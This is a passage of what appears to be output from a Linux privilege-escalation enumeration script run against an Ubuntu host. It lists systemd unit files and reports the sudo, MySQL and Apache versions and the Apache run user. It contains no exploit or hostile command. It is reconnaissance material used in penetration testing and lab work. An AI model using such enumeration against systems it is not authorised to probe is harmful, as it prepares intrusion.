lrwxrwxrwx 1 root root    9 Nov 15  2019 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Nov 15  2019 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Nov 15  2019 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Nov 15  2019 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Nov 15  2019 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   25 Nov 15  2019 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Nov 15  2019 debug-shell.service
lrwxrwxrwx 1 root root   16 Nov 15  2019 default.target -> graphical.target
-rw-r--r-- 1 root root  797 Nov 15  2019 emergency.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 fuse.service -> /dev/null
-rw-r--r-- 1 root root 2.0K Nov 15  2019 getty@.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  670 Nov 15  2019 initrd-cleanup.service
-rw-r--r-- 1 root root  830 Nov 15  2019 initrd-parse-etc.service
-rw-r--r-- 1 root root  589 Nov 15  2019 initrd-switch-root.service
-rw-r--r-- 1 root root  704 Nov 15  2019 initrd-udevadm-cleanup-db.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Nov 15  2019 kmod.service -> systemd-modules-load.service
-rw-r--r-- 1 root root  717 Nov 15  2019 kmod-static-nodes.service
lrwxrwxrwx 1 root root   28 Nov 15  2019 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Nov 15  2019 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  609 Nov 15  2019 quotaon.service
-rw-r--r-- 1 root root  716 Nov 15  2019 rc-local.service
lrwxrwxrwx 1 root root   16 Nov 15  2019 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 reboot.service -> /dev/null
-rw-r--r-- 1 root root  788 Nov 15  2019 rescue.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Nov 15  2019 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Nov 15  2019 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Nov 15  2019 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Nov 15  2019 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Nov 15  2019 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Nov 15  2019 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Nov 15  2019 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Nov 15  2019 sendsigs.service -> /dev/null
-rw-r--r-- 1 root root 1.5K Nov 15  2019 serial-getty@.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 stop-bootlogd-single.service -> /dev/null
-rw-r--r-- 1 root root  554 Nov 15  2019 suspend-then-hibernate.target
-rw-r--r-- 1 root root  724 Nov 15  2019 systemd-ask-password-console.service
-rw-r--r-- 1 root root  752 Nov 15  2019 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  752 Nov 15  2019 systemd-backlight@.service
-rw-r--r-- 1 root root  999 Nov 15  2019 systemd-binfmt.service
-rw-r--r-- 1 root root  537 Nov 15  2019 systemd-exit.service
-rw-r--r-- 1 root root  551 Nov 15  2019 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Nov 15  2019 systemd-fsckd.socket
-rw-r--r-- 1 root root  714 Nov 15  2019 systemd-fsck-root.service
-rw-r--r-- 1 root root  715 Nov 15  2019 systemd-fsck@.service
-rw-r--r-- 1 root root  584 Nov 15  2019 systemd-halt.service
-rw-r--r-- 1 root root  671 Nov 15  2019 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  541 Nov 15  2019 systemd-hibernate.service
-rw-r--r-- 1 root root 1.1K Nov 15  2019 systemd-hostnamed.service
-rw-r--r-- 1 root root  818 Nov 15  2019 systemd-hwdb-update.service
-rw-r--r-- 1 root root  559 Nov 15  2019 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  551 Nov 15  2019 systemd-initctl.service
-rw-r--r-- 1 root root  686 Nov 15  2019 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.6K Nov 15  2019 systemd-journald.service
-rw-r--r-- 1 root root  771 Nov 15  2019 systemd-journal-flush.service
-rw-r--r-- 1 root root  597 Nov 15  2019 systemd-kexec.service
-rw-r--r-- 1 root root 1.1K Nov 15  2019 systemd-localed.service
-rw-r--r-- 1 root root 1.5K Nov 15  2019 systemd-logind.service
-rw-r--r-- 1 root root  733 Nov 15  2019 systemd-machine-id-commit.service
-rw-r--r-- 1 root root 1007 Nov 15  2019 systemd-modules-load.service
-rw-r--r-- 1 root root 1.9K Nov 15  2019 systemd-networkd.service
-rw-r--r-- 1 root root  740 Nov 15  2019 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  593 Nov 15  2019 systemd-poweroff.service
-rw-r--r-- 1 root root  655 Nov 15  2019 systemd-quotacheck.service
-rw-r--r-- 1 root root  792 Nov 15  2019 systemd-random-seed.service
-rw-r--r-- 1 root root  588 Nov 15  2019 systemd-reboot.service
-rw-r--r-- 1 root root  833 Nov 15  2019 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.7K Nov 15  2019 systemd-resolved.service
-rw-r--r-- 1 root root  724 Nov 15  2019 systemd-rfkill.service
-rw-r--r-- 1 root root  537 Nov 15  2019 systemd-suspend.service
-rw-r--r-- 1 root root  573 Nov 15  2019 systemd-suspend-then-hibernate.service
-rw-r--r-- 1 root root  693 Nov 15  2019 systemd-sysctl.service
-rw-r--r-- 1 root root 1.1K Nov 15  2019 systemd-timedated.service
-rw-r--r-- 1 root root 1.4K Nov 15  2019 systemd-timesyncd.service
-rw-r--r-- 1 root root  659 Nov 15  2019 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  764 Nov 15  2019 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  744 Nov 15  2019 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  985 Nov 15  2019 systemd-udevd.service
-rw-r--r-- 1 root root  863 Nov 15  2019 systemd-udev-settle.service
-rw-r--r-- 1 root root  755 Nov 15  2019 systemd-udev-trigger.service
-rw-r--r-- 1 root root  797 Nov 15  2019 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  794 Nov 15  2019 systemd-update-utmp.service
-rw-r--r-- 1 root root  628 Nov 15  2019 systemd-user-sessions.service
-rw-r--r-- 1 root root  690 Nov 15  2019 systemd-volatile-root.service
-rw-r--r-- 1 root root 1.4K Nov 15  2019 system-update-cleanup.service
lrwxrwxrwx 1 root root   21 Nov 15  2019 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Nov 15  2019 urandom.service -> systemd-random-seed.service
-rw-r--r-- 1 root root  593 Nov 15  2019 user@.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  342 Nov 14  2019 getty-static.service
-rw-r--r-- 1 root root  362 Nov 14  2019 ondemand.service
-rw-r--r-- 1 root root  340 Oct 30  2019 snapd.autoimport.service
-rw-r--r-- 1 root root  320 Oct 30  2019 snapd.core-fixup.service
-rw-r--r-- 1 root root  172 Oct 30  2019 snapd.failure.service
-rw-r--r-- 1 root root  322 Oct 30  2019 snapd.seeded.service
-rw-r--r-- 1 root root  477 Oct 30  2019 snapd.service
-rw-r--r-- 1 root root  372 Oct 30  2019 snapd.snap-repair.service
-rw-r--r-- 1 root root  281 Oct 30  2019 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Oct 30  2019 snapd.socket
-rw-r--r-- 1 root root  521 Oct 30  2019 snapd.system-shutdown.service
lrwxrwxrwx 1 root root    9 Oct 10  2019 sudo.service -> /dev/null
-rw-r--r-- 1 root root  173 Sep 27  2019 motd-news.service
-rw-r--r-- 1 root root  161 Sep 27  2019 motd-news.timer
-rw-r--r-- 1 root root  326 Sep  3  2019 apt-daily.service
-rw-r--r-- 1 root root  156 Sep  3  2019 apt-daily.timer
-rw-r--r-- 1 root root  238 Sep  3  2019 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Sep  3  2019 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  289 Aug 26  2019 netplan-wpa@.service
-rw-r--r-- 1 root root  127 Aug 22  2019 fstrim.service
-rw-r--r-- 1 root root  205 Aug 22  2019 fstrim.timer
-rw-r--r-- 1 root root  189 Aug 22  2019 uuidd.service
-rw-r--r-- 1 root root  126 Aug 22  2019 uuidd.socket
-rw-r--r-- 1 root root  254 Aug 15  2019 thermald.service
lrwxrwxrwx 1 root root    9 Aug  5  2019 screen-cleanup.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Aug  5  2019 halt.target.wants
drwxr-xr-x 2 root root 4.0K Aug  5  2019 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Aug  5  2019 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Aug  5  2019 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Aug  5  2019 reboot.target.wants
-rw-r--r-- 1 root root  346 Jul 16  2019 apache2.service
-rw-r--r-- 1 root root  418 Jul 16  2019 apache2@.service
-rw-r--r-- 1 root root  528 Jul 16  2019 apache-htcacheclean.service
-rw-r--r-- 1 root root  537 Jul 16  2019 apache-htcacheclean@.service
-rw-r--r-- 1 root root  505 Jun 10  2019 dbus.service
-rw-r--r-- 1 root root  106 Jun 10  2019 dbus.socket
-rw-r--r-- 1 root root  312 Apr 23  2019 console-setup.service
-rw-r--r-- 1 root root  287 Apr 23  2019 keyboard-setup.service
-rw-r--r-- 1 root root  330 Apr 23  2019 setvtrgb.service
-rw-r--r-- 1 root root  481 Apr 10  2019 mdadm-grow-continue@.service
-rw-r--r-- 1 root root  210 Apr 10  2019 mdadm-last-resort@.service
-rw-r--r-- 1 root root  179 Apr 10  2019 mdadm-last-resort@.timer
lrwxrwxrwx 1 root root    9 Apr 10  2019 mdadm.service -> /dev/null
-rw-r--r-- 1 root root  670 Apr 10  2019 mdadm-shutdown.service
lrwxrwxrwx 1 root root    9 Apr 10  2019 mdadm-waitidle.service -> /dev/null
-rw-r--r-- 1 root root  388 Apr 10  2019 mdmonitor.service
-rw-r--r-- 1 root root 1.1K Apr 10  2019 mdmon@.service
-rw-r--r-- 1 root root  404 Apr  9  2019 ureadahead.service
-rw-r--r-- 1 root root  250 Apr  9  2019 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Apr  9  2019 ureadahead-stop.timer
-rw-r--r-- 1 root root  412 Apr  4  2019 plymouth-halt.service
-rw-r--r-- 1 root root  426 Apr  4  2019 plymouth-kexec.service
lrwxrwxrwx 1 root root   27 Apr  4  2019 plymouth-log.service -> plymouth-read-write.service
-rw-r--r-- 1 root root  421 Apr  4  2019 plymouth-poweroff.service
-rw-r--r-- 1 root root  194 Apr  4  2019 plymouth-quit.service
-rw-r--r-- 1 root root  200 Apr  4  2019 plymouth-quit-wait.service
-rw-r--r-- 1 root root  244 Apr  4  2019 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Apr  4  2019 plymouth-reboot.service
lrwxrwxrwx 1 root root   21 Apr  4  2019 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  532 Apr  4  2019 plymouth-start.service
-rw-r--r-- 1 root root  291 Apr  4  2019 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Apr  4  2019 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Apr  4  2019 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  463 Mar 28  2019 iscsid.service
-rw-r--r-- 1 root root  242 Feb  6  2019 apport-autoreport.service
-rw-r--r-- 1 root root  368 Jan  9  2019 irqbalance.service
-rw-r--r-- 1 root root  175 Dec 12  2018 iscsid.socket
-rw-r--r-- 1 root root  987 Dec 12  2018 open-iscsi.service
-rw-r--r-- 1 root root  605 Nov 23  2018 lxd.service
-rw-r--r-- 1 root root  320 Nov 23  2018 lxd-containers.service
-rw-r--r-- 1 root root  197 Nov 23  2018 lxd.socket
-rw-r--r-- 1 root root  311 Nov 23  2018 lxcfs.service
-rw-r--r-- 1 root root  618 Oct 15  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct 15  2018 friendly-recovery.target
-rw-r--r-- 1 root root  258 Oct 15  2018 networkd-dispatcher.service
-rw-r--r-- 1 root root  212 Jul 10  2018 apport-autoreport.path
-rw-r--r-- 1 root root  456 Jun 28  2018 ebtables.service
-rw-r--r-- 1 root root  309 May 30  2018 pollinate.service
-rw-r--r-- 1 root root  290 Apr 24  2018 rsyslog.service
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel5.target.wants
-rw-r--r-- 1 root root  175 Mar 27  2018 polkit.service
-rw-r--r-- 1 root root  544 Mar 22  2018 apparmor.service
-rw-r--r-- 1 root root  169 Feb 20  2018 atd.service
-rw-r--r-- 1 root root  919 Jan 28  2018 basic.target
-rw-r--r-- 1 root root  419 Jan 28  2018 bluetooth.target
-rw-r--r-- 1 root root  465 Jan 28  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  412 Jan 28  2018 cryptsetup.target
-rw-r--r-- 1 root root  750 Jan 28  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  665 Jan 28  2018 dev-mqueue.mount
-rw-r--r-- 1 root root  471 Jan 28  2018 emergency.target
-rw-r--r-- 1 root root  541 Jan 28  2018 exit.target
-rw-r--r-- 1 root root  480 Jan 28  2018 final.target
-rw-r--r-- 1 root root  506 Jan 28  2018 getty-pre.target
-rw-r--r-- 1 root root  500 Jan 28  2018 getty.target
-rw-r--r-- 1 root root  598 Jan 28  2018 graphical.target
-rw-r--r-- 1 root root  527 Jan 28  2018 halt.target
-rw-r--r-- 1 root root  509 Jan 28  2018 hibernate.target
-rw-r--r-- 1 root root  530 Jan 28  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  593 Jan 28  2018 initrd-fs.target
-rw-r--r-- 1 root root  561 Jan 28  2018 initrd-root-device.target
-rw-r--r-- 1 root root  566 Jan 28  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  754 Jan 28  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  763 Jan 28  2018 initrd.target
-rw-r--r-- 1 root root  541 Jan 28  2018 kexec.target
-rw-r--r-- 1 root root  435 Jan 28  2018 local-fs-pre.target
-rw-r--r-- 1 root root  547 Jan 28  2018 local-fs.target
-rw-r--r-- 1 root root  445 Jan 28  2018 machine.slice
-rw-r--r-- 1 root root  532 Jan 28  2018 multi-user.target
-rw-r--r-- 1 root root  505 Jan 28  2018 network-online.target
-rw-r--r-- 1 root root  502 Jan 28  2018 network-pre.target
-rw-r--r-- 1 root root  521 Jan 28  2018 network.target
-rw-r--r-- 1 root root  554 Jan 28  2018 nss-lookup.target
-rw-r--r-- 1 root root  513 Jan 28  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  394 Jan 28  2018 paths.target
-rw-r--r-- 1 root root  592 Jan 28  2018 poweroff.target
-rw-r--r-- 1 root root  417 Jan 28  2018 printer.target
-rw-r--r-- 1 root root  745 Jan 28  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  655 Jan 28  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  583 Jan 28  2018 reboot.target
-rw-r--r-- 1 root root  549 Jan 28  2018 remote-cryptsetup.target
-rw-r--r-- 1 root root  436 Jan 28  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  522 Jan 28  2018 remote-fs.target
-rw-r--r-- 1 root root  492 Jan 28  2018 rescue.target
-rw-r--r-- 1 root root  540 Jan 28  2018 rpcbind.target
-rw-r--r-- 1 root root  442 Jan 28  2018 shutdown.target
-rw-r--r-- 1 root root  402 Jan 28  2018 sigpwr.target
-rw-r--r-- 1 root root  460 Jan 28  2018 sleep.target
-rw-r--r-- 1 root root  449 Jan 28  2018 slices.target
-rw-r--r-- 1 root root  420 Jan 28  2018 smartcard.target
-rw-r--r-- 1 root root  396 Jan 28  2018 sockets.target
-rw-r--r-- 1 root root  420 Jan 28  2018 sound.target
-rw-r--r-- 1 root root  503 Jan 28  2018 suspend.target
-rw-r--r-- 1 root root  393 Jan 28  2018 swap.target
-rw-r--r-- 1 root root  795 Jan 28  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  558 Jan 28  2018 sysinit.target
-rw-r--r-- 1 root root  767 Jan 28  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  710 Jan 28  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1.4K Jan 28  2018 syslog.socket
-rw-r--r-- 1 root root  704 Jan 28  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  564 Jan 28  2018 systemd-initctl.socket
-rw-r--r-- 1 root root 1.2K Jan 28  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  882 Jan 28  2018 systemd-journald.socket
-rw-r--r-- 1 root root  631 Jan 28  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  657 Jan 28  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  490 Jan 28  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  635 Jan 28  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  610 Jan 28  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  445 Jan 28  2018 system.slice
-rw-r--r-- 1 root root  592 Jan 28  2018 system-update.target
-rw-r--r-- 1 root root  445 Jan 28  2018 timers.target
-rw-r--r-- 1 root root  435 Jan 28  2018 time-sync.target
-rw-r--r-- 1 root root  457 Jan 28  2018 umount.target
-rw-r--r-- 1 root root  432 Jan 28  2018 user.slice
-rw-r--r-- 1 root root  493 Jan 25  2018 ssh.service
-rw-r--r-- 1 root root  244 Jan 25  2018 ssh@.service
-rw-r--r-- 1 root root  155 Jan 17  2018 phpsessionclean.service
-rw-r--r-- 1 root root  144 Jan 17  2018 phpsessionclean.timer
-rw-r--r-- 1 root root  216 Jan 16  2018 ssh.socket
-rw-r--r-- 1 root root  462 Jan 15  2018 mysql.service
-rw-r--r-- 1 root root  741 Dec 18  2017 accounts-daemon.service
-rw-r--r-- 1 root root  246 Nov 20  2017 apport-forward.socket
-rw-r--r-- 1 root root  142 Nov 20  2017 apport-forward@.service
-rw-r--r-- 1 root root  251 Nov 16  2017 cron.service
-rw-r--r-- 1 root root  266 Aug 15  2017 ufw.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.path
-rw-r--r-- 1 root root  234 Apr 22  2017 acpid.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.socket
-rw-r--r-- 1 root root  626 Nov 28  2016 ifup@.service
-rw-r--r-- 1 root root  735 Nov 25  2016 networking.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Nov 15  2019 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Nov 15  2019 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Nov 15  2019 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Nov 15  2019 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Nov 15  2019 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Nov 15  2019 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Jun 10  2019 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Nov 15  2019 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Nov 15  2019 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Nov 15  2019 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Nov 15  2019 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Nov 15  2019 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Nov 15  2019 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Nov 15  2019 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Nov 15  2019 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Nov 15  2019 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Nov 15  2019 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Nov 15  2019 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 27 Nov 15  2019 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 Nov 15  2019 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Nov 15  2019 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Nov 15  2019 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Nov 15  2019 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Nov 15  2019 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Nov 15  2019 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Nov 15  2019 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 24 Nov 15  2019 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Nov 15  2019 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 30 Nov 15  2019 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Apr  4  2019 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Nov 15  2019 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Nov 15  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Nov 15  2019 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Nov 15  2019 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Nov 15  2019 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Nov 15  2019 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Nov 15  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Nov 15  2019 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Jun 10  2019 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 29 Apr  4  2019 plymouth-quit-wait.service -> ../plymouth-quit-wait.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Nov 15  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Nov 15  2019 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Nov 14  2019 debian.conf

/lib/systemd/system/user@.service.d:
total 4.0K
-rw-r--r-- 1 root root 125 Nov 14  2019 timeout.conf

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Jul 16  2019 apache2-systemd.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Apr  4  2019 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 28 Apr  4  2019 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 26 Apr  4  2019 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-generators:
total 240K
-rwxr-xr-x 1 root root  11K Dec  5  2019 lvm2-activation-generator
-rwxr-xr-x 1 root root 4.9K Dec  3  2019 cloud-init-generator
-rwxr-xr-x 1 root root  23K Nov 15  2019 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  10K Nov 15  2019 systemd-debug-generator
-rwxr-xr-x 1 root root  31K Nov 15  2019 systemd-fstab-generator
-rwxr-xr-x 1 root root  14K Nov 15  2019 systemd-getty-generator
-rwxr-xr-x 1 root root  26K Nov 15  2019 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  10K Nov 15  2019 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  10K Nov 15  2019 systemd-rc-local-generator
-rwxr-xr-x 1 root root  10K Nov 15  2019 systemd-system-update-generator
-rwxr-xr-x 1 root root  31K Nov 15  2019 systemd-sysv-generator
-rwxr-xr-x 1 root root  14K Nov 15  2019 systemd-veritysetup-generator
-rwxr-xr-x 1 root root  19K Oct 30  2019 snapd-generator
lrwxrwxrwx 1 root root   22 Aug 26  2019 netplan -> ../../netplan/generate
-rwxr-xr-x 1 root root  286 Jun 21  2019 friendly-recovery

/lib/systemd/system-sleep:
total 8.0K
-rwxr-xr-x 1 root root 219 Nov 25  2019 unattended-upgrades
-rwxr-xr-x 1 root root  92 Feb 22  2018 hdparm

/lib/systemd/network:
total 16K
-rw-r--r-- 1 root root 645 Jan 28  2018 80-container-host0.network
-rw-r--r-- 1 root root 718 Jan 28  2018 80-container-ve.network
-rw-r--r-- 1 root root 704 Jan 28  2018 80-container-vz.network
-rw-r--r-- 1 root root 412 Jan 28  2018 99-default.link

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 951 Jan 28  2018 90-systemd.preset

/lib/systemd/system-shutdown:
total 4.0K
-rwxr-xr-x 1 root root 160 Apr 10  2019 mdadm.shutdown


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.21p2


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.29, for Linux (x86_64) using  EditLine wrapper


[-] Apache version:
Server version: Apache/2.4.29 (Ubuntu)
Server built:   2019-09-16T12:58:48


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
